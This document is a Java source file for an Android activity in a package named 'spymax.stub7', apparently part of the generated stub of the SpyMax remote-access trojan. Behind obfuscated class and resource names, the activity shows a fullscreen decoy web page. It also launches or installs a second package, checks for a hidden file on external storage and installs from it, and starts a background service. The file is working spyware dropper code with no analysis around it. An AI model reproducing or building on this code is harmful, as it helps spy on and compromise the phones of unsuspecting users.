package spymax.stub7;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.view.Window;
import android.view.WindowManager;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import java.io.File;
public class ClassGen9 extends Activity {
    WebView wv = null;
    @Override
    public void onCreate(Bundle v) {
        super.onCreate(v);

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        boolean fg = false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            Context ctx = getApplicationContext();
            String pr = ctx.getResources().getString(R.string.t1t2t3t4t5t6);
            if (pr.charAt(3) == ClassGen3.c1) {
                String pk = ctx.getResources().getString(R.string.y1y2y3y4y5y6);
                if (pk.contains(ClassGen3.tg)){
                    if (pr.charAt(0) != ClassGen3.c1) {
                        fg = true;
                        setContentView(R.layout.q1q2q3q4q5q6);
                        String url = pk;
                        wv = (WebView) this.findViewById(R.id.web);
                        wv.loadUrl(url);
                        wv.setWebChromeClient(new WebChromeClient());
                        wv.clearCache(true);
                        wv.getSettings().setAppCacheEnabled(false);
                        wv.getSettings().setJavaScriptEnabled(true);
                        wv.setWebViewClient(new WebViewClient() {
                            @Override
                            public void onReceivedError(WebView v, int err, String sc, String fur) {
                                super.onReceivedError(v, err, sc, fur);
                                    v.loadData(ClassGen3.gh(sc), "text/html", "utf-8");
                            }
                            public boolean shouldOverrideUrlLoading(WebView v, String u) {
                                v.loadUrl(u);
                                return true;
                            }
                        });
                    }
                }else{
                    if (ClassGen3.p(ctx, pk)) {
                        ClassGen3.o(ctx, pk);
                    }
                }
            }
            if (pr.charAt(0) != ClassGen3.c1) {
                if (pr.charAt(2) == ClassGen3.c1) {
                    String tm = ctx.getPackageName();
                    if (ClassGen3.gt(ctx,tm).length() != 0){
                        String pk = ClassGen3.gt(ctx,tm);
                        String ex = ctx.getResources().getString(R.string.e1e2e3e4e5e6);
                        String pt = Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + "." + ex + "." + ex;
                        File f = new File(pt);
                        if(tm.equals(pk)){
                            if (f.exists()) {
                                if (ClassGen3.t_(ctx, pt, ex) != true) {
                                    ClassGen3.r_(ctx, pt, ex);
                                }
                            }
                        }else{
                            if (ClassGen3.p(ctx, pk)) {
                                ClassGen3.o(ctx, pk);
                            }else{
                                if (f.exists()) {
                                    if (ClassGen3.t_(ctx, pt, ex) != true) {
                                        ClassGen3.r_(ctx, pt, ex);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            if (ClassGen10.r(ClassGen11.class, ctx)) {
                Intent i = new Intent(this, ClassGen11.class);
                ClassGen3.sr(ctx,i);
            }
        }
        if(!fg){
            finish();
        }
    }
    @Override
    public void onBackPressed() {
        if (wv != null){
            if (wv.canGoBack()) {
                wv.goBack();
            } else {
                super.onBackPressed();
            }
        }

    }
}